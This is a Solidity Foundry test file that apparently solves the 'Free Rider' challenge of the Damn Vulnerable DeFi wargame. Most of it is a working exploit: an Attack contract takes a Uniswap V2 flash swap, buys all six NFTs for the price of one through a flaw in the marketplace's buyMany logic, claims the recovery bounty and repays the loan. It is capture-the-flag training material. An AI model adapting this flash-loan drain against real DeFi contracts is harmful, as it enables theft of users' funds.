// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {WETH9} from "../../src/WETH9.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import "../../src/free-rider/FreeRiderRecovery.sol";

import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../src/free-rider/Interfaces.sol";

contract FreeRiderTest is Test {
    address public deployer;
    address public player;
    address public devs;

    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;

    FreeRiderNFTMarketplace internal marketplace;
    FreeRiderRecovery internal devsContract;
    DamnValuableNFT internal nft;

    DamnValuableToken internal token;
    WETH9 internal weth;

    uint256 public constant NFT_PRICE = 15e18;
    uint256 public constant AMOUNT_OF_NFTS = 6;
    uint256 public constant MARKETPLACE_INITIAL_ETH_BALANCE = 90e18;

    uint256 PLAYER_INITIAL_ETH_BALANCE = 1e17;

    uint256 BOUNTY = 45e18;

    uint256 UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
    uint256 UNISWAP_INITIAL_WETH_RESERVE = 9_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    function setUp() public {
        deployer = makeAddr("deployer");
        player = makeAddr("player");
        devs = makeAddr("devs");

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);
        vm.deal(devs, BOUNTY);
        vm.startPrank(deployer);
        token = new DamnValuableToken();
        weth = new WETH9();
        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0,
            deployer,
            DEADLINE
        );

        // get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        assertEq(uniswapV2Pair.token0(), address(weth));
        assertEq(uniswapV2Pair.token1(), address(token));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        nft = marketplace.token();
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());

        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            assertEq(nft.ownerOf(i), address(deployer));
        }

        nft.setApprovalForAll(address(marketplace), true);
        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);

        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            tokenIds[i] = i;
            prices[i] = NFT_PRICE;
            emit log_named_uint("tokenIds[i]", tokenIds[i]);
            emit log_named_uint("prices[i]", prices[i]);
        }

        marketplace.offerMany(tokenIds, prices);
        assertEq(marketplace.offersCount(), 6);
        vm.stopPrank();

        vm.startPrank(devs);
        devsContract = new FreeRiderRecovery{value: BOUNTY}(player, address(nft));
        vm.stopPrank();
    }

    function exploit() public {
        vm.startPrank(player, player);
        Attack attack = new Attack(
            address(token),
            address(weth),
            address(uniswapV2Factory),
            address(marketplace),
            address(devsContract),
            address(nft)
        );
        attack.testFlashSwap(15e18);
        vm.stopPrank();
    }

    function test_exploit() public {
        exploit();

        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(devs);
            nft.transferFrom(address(devsContract), devs, tokenId);
            assertEq(nft.ownerOf(tokenId), devs);
        }

        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        assertGt(player.balance, BOUNTY);
        assertEq(address(devsContract).balance, 0);
    }
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract Attack is IUniswapV2Callee {
    address public token;
    address public weth;
    address public factory;
    address public marketplace;
    address public devsContract;
    address public nft;
    address public player = msg.sender;

    constructor(
        address _token,
        address _weth,
        address _factory,
        address _marketplace,
        address _devsContract,
        address _nft
    ) {
        token = _token;
        weth = _weth;
        factory = _factory;
        marketplace = _marketplace;
        devsContract = _devsContract;
        nft = _nft;
    }

    event Log(string message, uint256 val);
    event LogAddress(string message, address val);

    function testFlashSwap(uint256 _amount) external {
        address pair = IUniswapV2Factory(factory).getPair(weth, token);
        require(pair != address(0), "No pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0Out = weth == token0 ? _amount : 0;
        uint256 amount1Out = weth == token1 ? _amount : 0;

        bytes memory data = abi.encode(weth, _amount);
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data)
        external
        override
    {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);
        require(msg.sender == pair, "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount) = abi.decode(_data, (address, uint256));
        emit LogAddress("tokenBorrow", tokenBorrow);

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        emit Log("amount", amount);
        emit Log("amount0", _amount0);
        emit Log("amount1", _amount1);
        emit Log("fee", fee);
        emit Log("amountToRepay", amountToRepay);

        WETH9(payable(weth)).withdraw(amount);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        emit Log("this balance", address(this).balance);
        FreeRiderNFTMarketplace(payable(marketplace)).buyMany{value: 15e18}(tokenIds);
        emit Log("this balance", address(this).balance);

        // DamnValuableNFT(nft).setApprovalForAll(address(devsContract), true);
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), address(devsContract), i, abi.encode(player) ); // abi.encode(player) without this test fails???
        }
        WETH9(payable(weth)).deposit{value: amountToRepay}();
        IERC20(weth).transfer(pair, amountToRepay);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
